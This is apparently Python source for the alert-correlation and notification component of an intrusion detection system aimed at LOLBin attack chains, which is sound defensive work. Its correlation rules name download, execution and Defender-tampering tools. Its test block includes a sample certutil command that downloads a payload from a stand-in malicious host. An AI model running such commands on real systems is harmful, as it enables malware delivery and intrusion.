# notification_orchestrator.py
# Core component for alert correlation, prioritization and channel selection

import os
import json
import logging
import time
import threading
import queue
import socket
from .providers.provider_registry import ProviderRegistry
from datetime import datetime, timedelta
from collections import defaultdict
import importlib.util

class NotificationOrchestrator:
    """
    Orchestrates the notification process: determines which channels to use,
    correlates alerts, and enforces notification thresholds.
    """
    
    def __init__(self, config_file=None, alert_queue=None):
        """
        Initialize the notification orchestrator
        
        Args:
            config_file (str): Path to configuration file
            alert_queue (Queue): Queue to receive alerts from (optional)
        """
        # Load configuration
        self.config = self._load_config(config_file)
        
        # Initialize internal components
        self.alert_history = []  # Recent alerts for correlation
        self.recipients_state = defaultdict(lambda: defaultdict(lambda: {'last_notified': None, 'count': 0}))
        self.notification_channels = {}
        self.correlation_rules = []
        
        # Keep track of correlated alert groups
        self.alert_groups = {}
        
        # History retention period (default: 1 hour)
        self.history_retention = self.config.get('history_retention_minutes', 60)
        
        # Alert queue for background processing
        if alert_queue is None:
            self.alert_queue = queue.Queue()
        else:
            self.alert_queue = alert_queue
        
        # Initialize notification channels
        self._initialize_channels()
        
        # Load correlation rules
        self._load_correlation_rules()
        
        # Start background thread for cleanup
        self.running = True
        self.cleanup_thread = threading.Thread(target=self._cleanup_thread)
        self.cleanup_thread.daemon = True
        self.cleanup_thread.start()
        
        # Load notification providers dynamically
        self._load_providers()
        
        logging.info(f"Notification orchestrator initialized with {len(self.notification_channels)} channels")
    
    def _load_config(self, config_file):
        """Load configuration from file or use defaults"""
        default_config = {
            "notification_channels": {
                "system_tray": {
                    "enabled": True,
                    "min_severity": 1
                },
                "email": {
                    "enabled": True,
                    "min_severity": 3,
                    "throttle_minutes": 15,
                    "recipients": [],
                    "smtp_server": "smtp.example.com",
                    "smtp_port": 587,
                    "smtp_username": "",
                    "smtp_password": "",
                    "from_address": "lolbins-ids@example.com"
                },
                "sms": {
                    "enabled": False,
                    "min_severity": 4,
                    "throttle_minutes": 60,
                    "recipients": [],
                    "api_key": "",
                    "from_number": ""
                },
                "slack": {
                    "enabled": False,
                    "min_severity": 3,
                    "webhook_url": "",
                    "channel": "#security-alerts"
                },
                "teams": {
                    "enabled": False,
                    "min_severity": 3,
                    "webhook_url": ""
                },
                "websocket": {
                    "enabled": True,
                    "min_severity": 1
                }
            },
            "alert_correlation": {
                "enabled": True,
                "time_window_minutes": 15,
                "min_alerts_to_correlate": 2
            },
            "notification_thresholds": {
                "max_notifications_per_hour": 20,
                "cooldown_period_minutes": 30
            },
            "history_retention_minutes": 60
        }
        
        if config_file and os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    loaded_config = json.load(f)
                
                # Merge configs
                for key, value in loaded_config.items():
                    if key in default_config and isinstance(default_config[key], dict) and isinstance(value, dict):
                        default_config[key].update(value)
                    else:
                        default_config[key] = value
                
                logging.info(f"Loaded notification configuration from {config_file}")
                
            except Exception as e:
                logging.error(f"Error loading notification config: {str(e)}")
        
        return default_config
    
    def _initialize_channels(self):
        """Initialize notification channels"""
        # We'll load these dynamically later, just registering the configuration now
        for channel, config in self.config.get('notification_channels', {}).items():
            if config.get('enabled', False):
                self.notification_channels[channel] = config
                logging.info(f"Registered notification channel: {channel}")
            else:
                logging.info(f"Notification channel disabled: {channel}")
    
    def _load_correlation_rules(self):
        """Load alert correlation rules"""
        # Default correlation rules for LOLBin attack chains
        self.correlation_rules = [
            # Example: Certutil download followed by PowerShell execution
            {
                'name': 'Download and Execute Chain',
                'patterns': ['CertUtil Download', 'PowerShell.*Command'],
                'time_window_minutes': 10,
                'severity_boost': 1
            },
            # Example: Registry modification followed by scheduled task creation 
            {
                'name': 'Persistence Chain',
                'patterns': ['Regsvr32.*', '(schtasks|at.exe)'],
                'time_window_minutes': 15,
                'severity_boost': 1
            },
            # Multiple PowerShell executions in short time
            {
                'name': 'Multiple PowerShell Commands',
                'patterns': ['PowerShell.*', 'PowerShell.*'],
                'min_count': 3,
                'time_window_minutes': 5,
                'severity_boost': 1
            }
        ]
        
        # Add these advanced correlation rules
        self.correlation_rules.extend([
            {
                'name': 'Fileless Malware Chain',
                'patterns': ['PowerShell.*', 'Regsvr32.*', 'WMIC.*'],
                'time_window_minutes': 15,
                'severity_boost': 2
            },
            {
                'name': 'Defense Evasion Chain',
                'patterns': ['PowerShell.*hidden', '(Set-MpPreference|Add-MpPreference)', 'Regsvr32.*'],
                'time_window_minutes': 10,
                'severity_boost': 2
            },
            {
                'name': 'Data Exfiltration Attempt',
                'patterns': ['.*Download', 'BITSAdmin.*', '(Invoke-WebRequest|New-Object Net\\.WebClient)'],
                'time_window_minutes': 30,
                'severity_boost': 2
            }
        ])
        
        # Load custom rules if available
        custom_rules_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'config', 'correlation_rules.json')
        if os.path.exists(custom_rules_path):
            try:
                with open(custom_rules_path, 'r') as f:
                    custom_rules = json.load(f)
                    self.correlation_rules.extend(custom_rules)
                logging.info(f"Loaded {len(custom_rules)} custom correlation rules")
            except Exception as e:
                logging.error(f"Error loading custom correlation rules: {str(e)}")
    
    def _load_providers(self):
        """Load notification providers"""
        for channel_name, channel_config in self.notification_channels.items():
            if channel_config.get('enabled', False):
                provider = ProviderRegistry.get_provider(channel_name, channel_config)
                if provider:
                    self.notification_channels[channel_name]['provider'] = provider
                    logging.info(f"Loaded notification provider for channel: {channel_name}")
                else:
                    logging.warning(f"Could not load provider for channel: {channel_name}")
    
    def process_alert(self, alert):
        """
        Process an alert and determine which notification channels to use
        
        Args:
            alert (dict): The alert data
        """
        try:
            # Keep history for correlation
            self.add_to_history(alert)
            
            # Apply correlation rules
            correlated_alert = self.correlate_alerts(alert)
            
            # Apply notification thresholds and channel selection
            self.send_notifications(correlated_alert)
            
            return True
        except Exception as e:
            logging.error(f"Error processing alert for notification: {str(e)}")
            return False
    
    def add_to_history(self, alert):
        """
        Add an alert to the history for correlation purposes
        
        Args:
            alert (dict): The alert data
        """
        # Add timestamp if not present
        if 'timestamp' not in alert:
            alert['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
        # Add to history
        self.alert_history.append(alert)
    
    def correlate_alerts(self, alert):
        """
        Apply correlation rules to detect attack chains
        
        Args:
            alert (dict): The alert data
            
        Returns:
            dict: The possibly enhanced alert with correlation information
        """
        if not self.config.get('alert_correlation', {}).get('enabled', True):
            return alert
        
        # Make a copy of the alert to avoid modifying the original
        enhanced_alert = alert.copy()
        
        # Default correlation attributes if none exist
        if 'correlation' not in enhanced_alert:
            enhanced_alert['correlation'] = {
                'is_correlated': False,
                'group_id': None,
                'chain_position': 0,
                'related_alerts': []
            }
        
        current_time = datetime.now()
        username = alert.get('username', '')
        hostname = alert.get('hostname', socket.gethostname())
        
        # Check each correlation rule
        for rule in self.correlation_rules:
            rule_name = rule.get('name', 'Unnamed Rule')
            patterns = rule.get('patterns', [])
            time_window = rule.get('time_window_minutes', 15)
            min_count = rule.get('min_count', len(patterns))
            severity_boost = rule.get('severity_boost', 1)
            
            # Skip if not enough patterns
            if len(patterns) < 2:
                continue
            
            # Find recent alerts that match the first pattern in the rule
            current_rule_pattern = patterns[0]
            
            # If this alert doesn't match the first pattern, check if it matches any other pattern
            alert_rule_name = alert.get('rule_name', '')
            alert_matches_first = self._rule_matches_pattern(alert_rule_name, current_rule_pattern)
            
            if not alert_matches_first:
                # Check which pattern this alert matches, if any
                matching_pattern_idx = -1
                for i, pattern in enumerate(patterns):
                    if self._rule_matches_pattern(alert_rule_name, pattern):
                        matching_pattern_idx = i
                        break
                
                if matching_pattern_idx == -1:
                    # This alert doesn't match any pattern in this rule
                    continue
                
                # Check if we have other alerts that match preceding patterns
                potential_chain = True
                time_threshold = current_time - timedelta(minutes=time_window)
                preceding_matches = []
                
                # Look for alerts matching patterns before the current one
                for idx in range(matching_pattern_idx):
                    pattern = patterns[idx]
                    found_match = False
                    
                    for hist_alert in reversed(self.alert_history):
                        hist_time_str = hist_alert.get('timestamp', '')
                        try:
                            hist_time = datetime.strptime(hist_time_str, "%Y-%m-%d %H:%M:%S")
                        except ValueError:
                            continue
                        
                        if hist_time < time_threshold:
                            continue
                            
                        if (hist_alert.get('username', '') == username and 
                            hist_alert.get('hostname', hostname) == hostname and
                            self._rule_matches_pattern(hist_alert.get('rule_name', ''), pattern)):
                            preceding_matches.append(hist_alert)
                            found_match = True
                            break
                    
                    if not found_match:
                        potential_chain = False
                        break
                
                if not potential_chain or len(preceding_matches) < matching_pattern_idx:
                    continue
                
                # We found a chain! Create or update correlation group
                alert_group_id = f"{rule_name}-{username}-{current_time.strftime('%Y%m%d%H%M%S')}"
                
                # Check if we already have a group for this chain
                for match in preceding_matches:
                    if match.get('correlation', {}).get('group_id'):
                        alert_group_id = match['correlation']['group_id']
                        break
                
                # Update this alert with correlation info
                enhanced_alert['correlation'] = {
                    'is_correlated': True,
                    'group_id': alert_group_id,
                    'rule_name': rule_name,
                    'chain_position': matching_pattern_idx + 1,
                    'related_alerts': [a.get('rule_name', '') for a in preceding_matches],
                    'attack_chain_length': len(patterns),
                    'attack_chain_complete': matching_pattern_idx == len(patterns) - 1
                }
                
                # Boost severity if this completes an attack chain
                if matching_pattern_idx == len(patterns) - 1:
                    enhanced_alert['severity'] = min(5, enhanced_alert.get('severity', 3) + severity_boost)
                    enhanced_alert['correlation']['severity_boosted'] = True
                
                # Store group info
                self.alert_groups[alert_group_id] = {
                    'rule_name': rule_name,
                    'alerts': preceding_matches + [enhanced_alert],
                    'created_at': current_time,
                    'last_updated': current_time
                }
                
                # We found a correlation, no need to check other rules
                break
        
        return enhanced_alert
    
    def _rule_matches_pattern(self, rule_name, pattern):
        """Check if a rule name matches a pattern"""
        import re
        return bool(re.search(pattern, rule_name, re.IGNORECASE))
    
    def send_notifications(self, alert):
        """
        Send notifications through configured channels
        
        Args:
            alert (dict): The alert data
        """
        alert_severity = alert.get('severity', 1)
        
        # Check each notification channel
        for channel_name, channel_config in self.notification_channels.items():
            if not channel_config.get('enabled', False):
                continue
                
            # Check if severity meets the threshold for this channel
            min_severity = channel_config.get('min_severity', 1)
            if alert_severity < min_severity:
                continue
            
            # Check throttling for this channel
            if not self._check_throttling(channel_name, alert):
                logging.info(f"Notification throttled for channel: {channel_name}")
                continue
            
            # Get the provider for this channel
            provider = channel_config.get('provider')
            if not provider:
                logging.warning(f"No provider available for channel: {channel_name}")
                continue
            
            try:
                # Send notification through the provider
                result = provider.send_notification(alert)
                if result:
                    logging.info(f"Sent notification through channel: {channel_name}")
                else:
                    logging.warning(f"Failed to send notification through channel: {channel_name}")
            except Exception as e:
                logging.error(f"Error sending notification through {channel_name}: {str(e)}")
    
    def _check_throttling(self, channel_name, alert):
        """
        Check if notifications should be throttled for this recipient
        
        Args:
            channel_name (str): The notification channel name
            alert (dict): The alert data
            
        Returns:
            bool: True if notification should be sent, False if throttled
        """
        # For highly correlated or critical alerts, bypass throttling
        is_correlated = alert.get('correlation', {}).get('is_correlated', False)
        attack_chain_complete = alert.get('correlation', {}).get('attack_chain_complete', False)
        is_critical = alert.get('severity', 0) >= 5
        
        if (is_correlated and attack_chain_complete) or is_critical:
            return True
        
        channel_config = self.notification_channels.get(channel_name, {})
        throttle_minutes = channel_config.get('throttle_minutes', 15)
        
        # Check if channel has recipients
        if 'recipients' in channel_config:
            recipients = channel_config.get('recipients', [])
            if not recipients:
                # No recipients configured, use a default key
                recipients = ['default']
        else:
            # Channels without explicit recipients (like system tray)
            recipients = ['default']
        
        current_time = datetime.now()
        throttled = False
        
        for recipient in recipients:
            # Check last notification time for this recipient and channel
            last_notified = self.recipients_state[channel_name][recipient].get('last_notified')
            if last_notified:
                time_since_last = (current_time - last_notified).total_seconds() / 60
                if time_since_last < throttle_minutes:
                    throttled = True
                    # Don't break, update counters for all recipients
            
            # Update notification state for this recipient
            self.recipients_state[channel_name][recipient]['last_notified'] = current_time
            self.recipients_state[channel_name][recipient]['count'] += 1
        
        return not throttled
    
    def _cleanup_thread(self):
        """Background thread for cleaning up old alerts"""
        while self.running:
            try:
                # Clean up alert history
                self._cleanup_alert_history()
                
                # Clean up alert groups
                self._cleanup_alert_groups()
                
                # Wait for next cleanup cycle (every 5 minutes)
                time.sleep(300)
            except Exception as e:
                logging.error(f"Error in cleanup thread: {str(e)}")
                time.sleep(60)
    
    def _cleanup_alert_history(self):
        """Clean up old alerts from history"""
        if not self.alert_history:
            return
            
        current_time = datetime.now()
        retention_time = timedelta(minutes=self.history_retention)
        cutoff_time = current_time - retention_time
        
        # Remove alerts older than the retention period
        new_history = []
        for alert in self.alert_history:
            try:
                alert_time_str = alert.get('timestamp', '')
                alert_time = datetime.strptime(alert_time_str, "%Y-%m-%d %H:%M:%S")
                if alert_time >= cutoff_time:
                    new_history.append(alert)
            except ValueError:
                # Keep alerts with invalid timestamps (shouldn't happen)
                new_history.append(alert)
        
        removed_count = len(self.alert_history) - len(new_history)
        if removed_count > 0:
            logging.info(f"Cleaned up {removed_count} old alerts from history")
            
        self.alert_history = new_history
    
    def _cleanup_alert_groups(self):
        """Clean up old alert groups"""
        if not self.alert_groups:
            return
            
        current_time = datetime.now()
        retention_time = timedelta(minutes=self.history_retention)
        cutoff_time = current_time - retention_time
        
        # Remove alert groups older than the retention period
        groups_to_remove = []
        for group_id, group_data in self.alert_groups.items():
            if group_data.get('last_updated', datetime.min) < cutoff_time:
                groups_to_remove.append(group_id)
        
        for group_id in groups_to_remove:
            del self.alert_groups[group_id]
            
        if groups_to_remove:
            logging.info(f"Cleaned up {len(groups_to_remove)} old alert groups")
    
    def shutdown(self):
        """Shutdown the orchestrator and its threads"""
        self.running = False
        if hasattr(self, 'cleanup_thread') and self.cleanup_thread.is_alive():
            self.cleanup_thread.join(timeout=2.0)
        logging.info("Notification orchestrator shut down")

# For testing
if __name__ == "__main__":
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    # Test the notification orchestrator
    orchestrator = NotificationOrchestrator()
    
    # Create a test alert
    test_alert = {
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'rule_name': "CertUtil Download",
        'description': "CertUtil used to download files from internet",
        'severity': 4,
        'process_name': "certutil.exe",
        'command_line': "certutil.exe -urlcache -f http://malicious.com/payload.exe C:\\temp\\file.exe",
        'pid': 1234,
        'username': "test_user"
    }
    
    # Process the test alert
    orchestrator.process_alert(test_alert)
    
    # Create a follow-up alert for correlation testing
    followup_alert = {
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'rule_name': "PowerShell Encoded Command",
        'description': "PowerShell executing encoded commands",
        'severity': 4,
        'process_name': "powershell.exe",
        'command_line': "powershell.exe -EncodedCommand ZQBjAGgAbwAgACIASABlAGwAbABvACIACgA=",
        'pid': 1235,
        'username': "test_user"
    }
    
    # Process the followup alert to test correlation
    orchestrator.process_alert(followup_alert)
    
    # Shutdown orchestrator
    orchestrator.shutdown()